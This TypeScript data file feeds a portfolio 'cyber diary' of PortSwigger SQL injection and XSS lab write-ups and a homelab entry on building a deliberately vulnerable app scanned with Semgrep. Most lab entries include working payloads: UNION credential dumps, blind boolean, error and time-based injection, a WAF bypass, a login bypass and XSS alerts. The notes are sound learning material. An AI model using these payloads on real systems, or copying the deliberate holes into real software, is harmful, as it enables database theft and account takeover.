export interface DiaryLab {
  title: string
  notes: string[]
  solution: string
  /** Whether the lab was fully solved. Some blind/OAST labs are blocked behind Burp Pro. */
  status?: 'completed' | 'in-progress' | 'blocked'
  /** Path to a reference screenshot, relative to src/assets, e.g. 'Burp/Lab10.png' */
  screenshot?: string
  /** Path to an accompanying automation script, relative to src/assets, e.g. 'LabScripts/sqli_solver.py' */
  script?: string
}

export interface DiaryEntry {
  id: string
  /** ISO date string, e.g. '2026-07-28'. Used for sorting. */
  date: string
  category: string
  /** Broad vulnerability class this entry belongs to, used for filtering (e.g. 'SQL Injection', 'XSS'). */
  vulnType: string
  title: string
  /** What you actually did that day. */
  workedOn: string[]
  /** Intro or reflection before lab breakdown. */
  body: string[]
  /** Per-lab write-ups with solutions. */
  labs?: DiaryLab[]
  tools?: string[]
  tags?: string[]
  link?: { label: string; url: string }
  milestone?: boolean
  screenshot?: string
  screenshots?: string[]
}

/**
 * Add new posts at the top of this array (newest first).
 * Keep dates as YYYY-MM-DD so sorting stays correct.
 */
export const cyberDiaryEntries: DiaryEntry[] = [
  {
    id: 'appsec-homelab-entry-4-first-pipeline-run',
    date: '2026-08-01',
    category: 'AppSec Homelab',
    vulnType: 'AppSec Homelab',
    title:
      'AppSec Homelab Entry 4: building the vulnerable app and running the first pipeline scan',
    workedOn: [
      'Built a bare-bones vulnerable-by-design app (.NET/C# backend, TypeScript/React frontend) to test what I learned in the PortSwigger SQLi and XSS labs',
      'Debugged the app from first build errors through to a working login and product search',
      'Manually confirmed the SQLi login bypass and reflected XSS both work as intended',
      'Added a GitHub Actions workflow running Semgrep, and fixed the first real finding it produced',
    ],
    body: [
      "Started today by testing out what I've learned from the labs with SQLi and XSS. Created a new repo specifically for an app that's deliberately vulnerable to these attacks - a bare-bones product search on the main page, with a login that can be bypassed via SQLi.",
      "Haven't done C# in a while, so this doubled as shaking off the cobwebs. Had some assistance from Claude to help jog my memory on different things. Hit a lot of errors getting it building for the first time - login didn't work, product search didn't work. Most were easy fixes once I found them: references not resolving, spelling mistakes, and issues connecting the backend to the frontend.",
      "Once it was up and running, I could actually test what I'd learned: logging in with administrator'-- and a random password logged me in as admin, and searching <img src=x onerror=alert(1)> triggered the alert. One thing the PortSwigger labs never show is what the code actually looks like behind a vulnerability like this - seeing the raw string concatenation that causes it was genuinely useful in a way reading about it isn't.",
      'After committing everything, I set up a GitHub Actions workflow with Semgrep to catch issues automatically. It picked up the SQL injection in ProductsController.cs immediately, which was great to see work. It did NOT flag the XSS in the frontend, though - something to dig into and tweak the ruleset for next time.',
      'The genuinely unexpected find was a second blocking issue, unrelated to the app itself: the workflow file was using a mutable actions/checkout@v4 tag rather than a pinned commit SHA, which Semgrep flagged as a supply chain risk (A03:2025 - Software Supply Chain Failures) - tags and branch refs can be silently repointed by the action owner, which is exactly how the trivy-action and kics-github-action compromises happened. Fixed it by pinning to the full SHA: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608 # v4.',
      "That's as far as I got this round. Next step is figuring out why the XSS didn't get flagged and tweaking the Semgrep config to catch it too.",
    ],
    tools: [
      '.NET / C#',
      'TypeScript',
      'React',
      'SQLite',
      'GitHub Actions',
      'Semgrep',
    ],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'XSS',
      'CI/CD pipeline',
      'Semgrep',
      'software supply chain',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
    screenshots: [
      'Homelab/SQLiHomeLabDay1.png',
      'Homelab/XSSHomeLabDay1.png',
      'Homelab/WorkflowRunningDay1.png',
      'Homelab/FirstWorkflowResultDay1.png',
    ],
  },
  {
    id: 'portswigger-xss-labs-1',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnType: 'XSS',
    title: 'Cross-Site Scripting (XSS) Lab 1 (reflected XSS)',
    workedOn: [
      'Started the PortSwigger Cross-Site Scripting (XSS) learning path',
      'Completed Lab 1: reflected XSS into an HTML context with nothing encoded',
    ],
    body: [
      'First attempt at XSS after finishing the SQL injection path. Different mental model to SQLi - instead of manipulating a database query, the goal is getting the browser itself to execute a script that gets reflected back into the page unencoded.',
      'Went in with a rough idea from JavaScript that a <script> tag triggers execution, but the specifics of what actually fires in a browser context took a bit of trial and error.',
    ],
    screenshot: 'Burp/Lab1XSS.png',
    labs: [
      {
        title: 'Lab 1: Reflected XSS into HTML context with nothing encoded',
        notes: [
          "Started with <script>alert</script> - failed. Referencing alert on its own doesn't call it, it just refers to the function.",
          'Realised alert needs to actually be invoked as a function call: <script>alert(1)</script> - this fired the alert and solved the lab.',
          'Takeaway: the payload needs to be valid, executable JavaScript, not just the presence of a <script> tag - the same rule as writing normal JS in a console.',
        ],
        solution: '<script>alert(1)</script>',
        status: 'completed',
      },
    ],
    tools: ['Web Browser', 'Burp Suite'],
    tags: ['XSS', 'reflected XSS', 'JavaScript'],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'portswigger-sqli-path-complete',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnType: 'SQL Injection',
    milestone: true,
    title: 'SQL Injection learning path: complete (Community Edition)',
    workedOn: [
      'Finished every SQL injection lab reachable on Burp Suite Community Edition',
      'Labs 15 and 16 remain blocked - both need Burp Collaborator, which is Professional-only',
    ],
    body: [
      'Closing out the SQL injection learning path for now. Went from basic WHERE-clause tautologies through UNION attacks on Oracle, MySQL, and PostgreSQL, blind SQLi via conditional responses, conditional errors, and time delays, and a WAF bypass using XML encoding via Hackvertor.',
      'Labs 15 and 16 need Burp Collaborator, which sits behind a Professional licence. Flagging them as blocked rather than skipping past quietly - revisiting once I upgrade or find a trial window.',
    ],
    screenshot: 'Burp/CompletedSQLiLabs.png',
    tools: [
      'Burp Suite',
      'Burp Proxy',
      'Burp Repeater',
      'Hackvertor extension',
      'Python',
    ],
    tags: ['SQL injection', 'milestone', 'PortSwigger Web Security Academy'],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },

  {
    id: 'portswigger-sqli-labs-13-17',
    date: '2026-07-30',
    category: 'PortSwigger Labs',
    vulnType: 'SQL Injection',
    title:
      'SQL Injection labs 13-17 (error-based, time-based blind, WAF bypass)',
    workedOn: [
      'Completed labs 13, 14, and 17 on the PortSwigger SQL injection path',
      'Made partial progress on lab 14 (time-based blind) and could not attempt labs 15-16 (out-of-band) on Burp Community Edition',
      'Used CAST()-based error leakage, pg_sleep() time delays, and the Hackvertor extension to bypass a WAF filter',
    ],
    body: [
      'Final session on the SQLi learning path for now. This batch moved from straightforward UNION attacks into blind techniques that lean on errors, timing, and filter evasion rather than direct data output.',
      'Biggest takeaway: blind SQLi is really just a slower version of the same logic - confirm the injection point, find a reliable true/false signal (an error, a delay, a message), then automate the character-by-character extraction because doing it by hand does not scale past a couple of characters.',
    ],

    labs: [
      {
        title: 'Lab 13: Visible error-based SQL injection',
        notes: [
          'Adding a single quote to the trackingId broke the query and returned a verbose Postgres error, confirming the injection point and leaking the underlying query structure.',
          'Followed the CAST() technique from the code-along to force type-conversion errors that leak data back through the error message.',
          "' AND 1=CAST((SELECT username FROM users) as int)-- initially failed because the subquery returned more than one row.",
          "Adding LIMIT 1 fixed it: ' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)-- leaked the first username directly in the Postgres error text.",
          'Repeated the same pattern against the password column to leak the credential.',
        ],
        solution:
          "' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--\n\nError message leaked the password directly.",
        status: 'completed',
      },
      {
        title:
          'Lab 14: Blind SQL injection with time delays and information retrieval',
        notes: [
          "Confirmed the injection with ' || pg_sleep(10)-- and timing the Repeater response - just over 10 seconds confirmed it.",
          "Built a conditional delay to ask true/false questions: ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)-- - first attempt failed from a missing END keyword.",
          'Used the same CASE pattern to confirm the administrator account exists, then started narrowing the password length (>1, >10, >20 all returned a 10s delay, then >20 came back instantly).',
          "Burp Intruder isn't available on Community Edition, so full character-by-character extraction still needs to be scripted rather than done manually.",
        ],
        solution:
          'Scripted the rest of the password using the sqli_solver.py script.',
        status: 'completed',
        script: 'LabScripts/lab14.py',
      },
      {
        title: 'Lab 15: Blind SQL injection with out-of-band interaction',
        notes: [
          'This lab needs Burp Collaborator for out-of-band interactions, which is a Burp Suite Professional feature.',
          'Parking this until I can justify the licence cost or find a free trial window.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST). Revisiting once upgraded.',
        status: 'blocked',
      },
      {
        title: 'Lab 16: Blind SQL injection with out-of-band data exfiltration',
        notes: [
          'Same blocker as Lab 15 - out-of-band exfiltration needs Collaborator, which is Professional-only.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST). Revisiting once upgraded.',
        status: 'blocked',
      },
      {
        title: 'Lab 17: SQL injection with filter bypass via XML encoding',
        notes: [
          'Intercepted the "Check Stock" request in Burp, which is where the XML-based injection point lives.',
          'A plain UNION SELECT NULL got blocked immediately with a 403 "Attack detected" response from the filter.',
          'Installed the Hackvertor extension in Burp and encoded the payload with hex_entities, which let the request through with a 200.',
          "Confirmed the injection point with an extra NULL, then used concatenation to get both fields out through the single visible field: UNION SELECT username || '~' || password FROM users.",
        ],
        solution:
          "UNION SELECT username || '~' || password FROM users\n\nCredentials found:\ncarlos~g6eafkale8omhjqkm6o7\nadministrator~ybqknjr1xvaa80bk7trd\nwiener~4hnvro74rym1ileky75x",
        status: 'completed',
      },
    ],
    tools: [
      'Burp Suite',
      'Burp Proxy',
      'Burp Repeater',
      'Hackvertor extension',
    ],
    tags: [
      'SQL injection',
      'error-based SQLi',
      'blind SQLi',
      'time-based blind',
      'WAF bypass',
      'PostgreSQL',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
  {
    id: 'portswigger-sqli-labs-11-12',
    date: '2026-07-29',
    category: 'PortSwigger Labs',
    vulnType: 'SQL Injection',
    title: 'SQL Injection labs 11-12 (blind, conditional responses and errors)',
    workedOn: [
      'Completed labs 11 and 12 on the PortSwigger SQL injection path',
      'Worked with blind SQL injection where no data or query error is returned directly to the page',
      'Wrote Python scripts to automate character-by-character password extraction, since Burp Intruder is not available on Community Edition',
    ],
    body: [
      'First real exposure to blind SQLi. Unlike the UNION labs, there is no data reflected on the page at all - the only signal is whether a "Welcome back" message appears or not, so the whole approach shifts to asking the database true/false questions one bit at a time.',
      'Doing this by hand for a 20-character password is not realistic, so this session doubled as an excuse to write my first proper SQLi automation scripts in Python.',
    ],
    labs: [
      {
        title: 'Lab 11: Blind SQL injection with conditional responses',
        notes: [
          "Confirmed the tracking cookie feeds into the query by appending ' and 1=1--' and comparing the response against 1=0.",
          "Confirmed a users table exists with: ' and (select 'x' FROM users LIMIT 1)='x'--",
          "Confirmed the administrator account exists with: ' and (select username FROM users WHERE username='administrator')='administrator'--",
          'Realised that comparing the password directly to a guess would just be brute-forcing the login form through the back door, so length and character enumeration was the way to go.',
          'Narrowed the password length with LENGTH(password)>N checks (true past 6, 10, and 15, false past 20), confirming 20 characters.',
          "Burp Intruder isn't available on Community Edition, so wrote a Python script to automate the substring(password,1,1) character comparisons instead of doing it manually.",
        ],
        solution:
          "' and (select username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--\n\nExtracted character-by-character via script.\n\nCredentials found:\nadministrator\nkk9s1reehirw9tayifqx",
        status: 'completed',
        script: 'LabScripts/sqli_solver.py',
      },
      {
        title: 'Lab 12: Blind SQL injection with conditional errors',
        notes: [
          'Different flavour of blind SQLi - this one forces a database error instead of a conditional message.',
          "Confirmed Oracle with: TrackingId=...' || (select '' FROM dual) || '",
          "Confirmed the users table exists using rownum so the query doesn't break: ' || (select '' FROM users WHERE rownum=1) || '",
          "Checking WHERE username='administrator' directly always returned 200 regardless of whether it matched, so a conditional error was needed instead.",
          "Built a CASE WHEN that only throws a divide-by-zero error when the condition is true: ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '",
          'First attempt failed from a missing (1/0) and a stray space in TO_CHAR.',
          "Used the same pattern against the users table to confirm the administrator account and narrow the password length to 20 characters, then scripted the rest since Intruder isn't available on Community Edition.",
        ],
        solution:
          "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>N) || '\n\nCredentials found:\nadministrator\n1jstrwe8vruggjowu1la",
        status: 'completed',
        script: 'LabScripts/lab12.py',
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater', 'Python'],
    tags: [
      'SQL injection',
      'blind SQLi',
      'conditional responses',
      'conditional errors',
      'Oracle',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
  {
    id: 'portswigger-sqli-labs-1-10',
    date: '2026-07-28',
    category: 'PortSwigger Labs',
    vulnType: 'SQL Injection',
    title: 'SQL Injection labs 1-10 (Burp Suite)',
    workedOn: [
      'Completed labs 1-10 on the PortSwigger SQL injection path',
      'Used Burp Proxy to intercept traffic and Repeater to send payloads',
      'Worked through WHERE clause bypass, login bypass, UNION attacks across Oracle/MySQL/PostgreSQL, data type and column discovery, and dumping credentials',
    ],
    body: [
      'First proper session on the Web Security Academy SQL injection module. Burp Repeater was the main tool once I had a request captured from Proxy.',
      'Main takeaway: comment syntax and version functions change per database (-- vs #, v$version vs @@version vs version()). Getting the column count with ORDER BY (or the UNION SELECT NULL method) and confirming text columns with UNION SELECT came up in almost every lab.',
      "By Lab 10, I'd also picked up the || concatenation trick for squeezing two values (username and password) into a single visible column when the page only renders one field.",
    ],
    labs: [
      {
        title:
          'Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data',
        notes: [
          'Vulnerable parameter is the category filter on the product listing page.',
          'Appending a tautology to the WHERE clause returns all rows, including hidden ones.',
        ],
        solution: "GET /filter?category=Gifts' OR '1'='1",
        status: 'completed',
      },
      {
        title: 'Lab 2: SQL injection vulnerability allowing login bypass',
        notes: [
          "Adding a single quote (') caused the page to fail, confirming the input is passed into a SQL query.",
          'Goal was to log in as administrator. Testing username admin with a quote did not work.',
          "The login query looks like: SELECT firstname FROM users WHERE username='...' AND password='...'",
          "Using a comment to skip the password check: administrator'-- with any password value.",
        ],
        solution: "Username: administrator'--  |  Password: (anything)",
        status: 'completed',
      },
      {
        title:
          'Lab 3: SQL injection attack, querying the database type and version on Oracle',
        notes: [
          'Intercepted the category filter request in Burp Proxy and sent it to Repeater.',
          "category=Gifts' ORDER BY 1-- → 200",
          "category=Gifts' ORDER BY 2-- → 200",
          "category=Gifts' ORDER BY 3-- → 500, so 2 columns confirmed.",
          "category=Gifts' UNION SELECT 'a', 'a' FROM DUAL-- → 200. FROM DUAL confirms Oracle.",
        ],
        solution: "' UNION SELECT banner, NULL FROM v$version--",
        status: 'completed',
      },
      {
        title:
          'Lab 4: SQL injection attack, querying database type and version on MySQL and Microsoft',
        notes: [
          'Intercept via Burp, send to Repeater.',
          "category=Accessories' ORDER BY 1-- → 500. Comment syntax -- did not work here.",
          "category=Accessories' ORDER BY 1# → 200. # works as the comment character on this database.",
          'ORDER BY 2# → 200, ORDER BY 3# → 500. Two columns again.',
          'Both columns display text on the page.',
          "category=Accessories' UNION SELECT 'a', 'a'# → 200.",
          'Not Oracle (no FROM DUAL needed). Microsoft/SQL Server uses @@version.',
        ],
        solution: "' UNION SELECT @@version, NULL#",
        status: 'completed',
      },
      {
        title:
          'Lab 5: SQL injection attack, listing the database contents on non-Oracle databases',
        notes: [
          'Intercept and Repeater again on the category filter.',
          'ORDER BY 1-- and ORDER BY 2-- → 200. ORDER BY 3-- → 500. Two columns.',
          "UNION SELECT 'a', 'a'-- → 200. Both columns hold text.",
          '@@version → 500, so not Microsoft SQL Server.',
          'version() → 200, so PostgreSQL.',
          'UNION SELECT table_name, NULL FROM information_schema.tables-- → 200. Found table: users_ocetwc.',
          'First attempt at column lookup returned 500 because I wrote information.schema instead of information_schema.',
          "UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_ocetwc'-- → username_oslrwn and password_epjcib.",
          'Dumped credentials and logged in as administrator successfully.',
          'Remember the trailing -- on payloads; forgetting it caused a 500 more than once.',
        ],
        solution:
          "' UNION SELECT username_oslrwn, password_epjcib FROM users_ocetwc--\n\nCredentials found:\nadministrator\no0cg3skime8olq3u1au0",
        status: 'completed',
      },
      {
        title:
          'Lab 6: SQL injection attack, listing the database contents on Oracle',
        notes: [
          'Same goal as Lab 5, but adapted for Oracle syntax.',
          "category=Accessories' ORDER BY 1--, ORDER BY 2-- → 200, ORDER BY 3-- → 500. Two columns confirmed.",
          "UNION SELECT 'a', 'a'-- → 500 at first - missing FROM DUAL, which Oracle requires for a UNION with no real table.",
          "UNION SELECT 'a', 'a' FROM DUAL-- → 200, confirming Oracle (the query failing without DUAL was itself a giveaway).",
          'Reused the Lab 3 version query: UNION SELECT banner, NULL FROM v$version--',
          'UNION SELECT table_name, NULL FROM all_tables-- → found table USERS_QAXEJG.',
          "UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_QAXEJG'-- → USERNAME_XWMTOF, PASSWORD_QGYRAI.",
          'The PortSwigger cheat sheet was useful here for the Oracle-specific system tables (all_tables, all_tab_columns) instead of information_schema.',
        ],
        solution:
          "' UNION SELECT USERNAME_XWMTOF, PASSWORD_QGYRAI FROM USERS_QAXEJG--\n\nCredentials found:\nadministrator\no3u5naqxsdx95uck2hd8",
        status: 'completed',
      },
      {
        title:
          'Lab 7: SQL injection UNION attack, determining the number of columns returned by the query',
        notes: [
          'Two rules to remember for UNION: the number and order of columns must match across queries, and the data types must be compatible.',
          "Instead of ORDER BY, used ' UNION SELECT NULL-- and kept adding NULLs until the 500 error cleared.",
          "' UNION SELECT NULL, NULL, NULL-- returned 200, confirming three columns.",
        ],
        solution: "' UNION SELECT NULL, NULL, NULL--",
        status: 'completed',
      },
      {
        title:
          'Lab 8: SQL injection UNION attack, finding a column containing text',
        notes: [
          'Confirmed three columns using the NULL method from Lab 7.',
          "Tested each position individually: ' UNION SELECT 'a', NULL, NULL-- then ' UNION SELECT NULL, 'a', NULL--",
          'The second position came back 200, confirming that column accepts text.',
          'Initially used a placeholder value and expected the lab to complete on that alone, but the lab description actually asked for a specific value rather than an arbitrary string.',
          "Adjusted to the exact required value: ' UNION SELECT NULL, '2AxW05', NULL--",
        ],
        solution: "' UNION SELECT NULL, '2AxW05', NULL--",
        status: 'completed',
      },
      {
        title:
          'Lab 9: SQL injection UNION attack, retrieving data from other tables',
        notes: [
          "Confirmed two text columns with the usual ' UNION SELECT 'a', 'a'--",
          "Queried the users table directly: ' UNION SELECT username, password FROM users--",
          'Response was 200 and the credentials appeared directly on the product listing page.',
        ],
        solution:
          "' UNION SELECT username, password FROM users--\n\nCredentials found:\nadministrator\nu7p40o4mwjnw2eo4pb2b",
        status: 'completed',
      },
      {
        title:
          'Lab 10: SQL injection UNION attack, retrieving multiple values in a single column',
        notes: [
          'Confirmed two columns via ORDER BY, but only one column is actually rendered on the page - the other looks like an ID field.',
          "' UNION SELECT NULL, username FROM users-- surfaced all the usernames but not the passwords, and running it twice (once per field) felt clunky.",
          "Used the || concatenation operator to combine both values into the single visible column: ' UNION SELECT NULL, username || password FROM users--",
        ],
        solution: "' UNION SELECT NULL, username || password FROM users--",
        status: 'completed',
        screenshot: 'Burp/Lab10.png',
      },
    ],
    tools: ['Burp Suite', 'Burp Proxy', 'Burp Repeater'],
    tags: [
      'SQL injection',
      'UNION attacks',
      'Oracle',
      'MySQL',
      'PostgreSQL',
      'login bypass',
    ],
    link: {
      label: 'SQL injection labs',
      url: 'https://portswigger.net/web-security/sql-injection',
    },
  },
]

/** Distinct vulnerability classes present in the diary, in the order they first appear. Feed this into a filter dropdown/tabs. */
export const vulnTypes: string[] = Array.from(
  new Set(cyberDiaryEntries.map((entry) => entry.vulnType)),
)

/** Returns entries matching a vulnType, or all entries when type is null/'All'. */
export function filterEntriesByVulnType(
  entries: DiaryEntry[],
  vulnType: string | null,
): DiaryEntry[] {
  if (!vulnType || vulnType === 'All') return entries
  return entries.filter((entry) => entry.vulnType === vulnType)
}
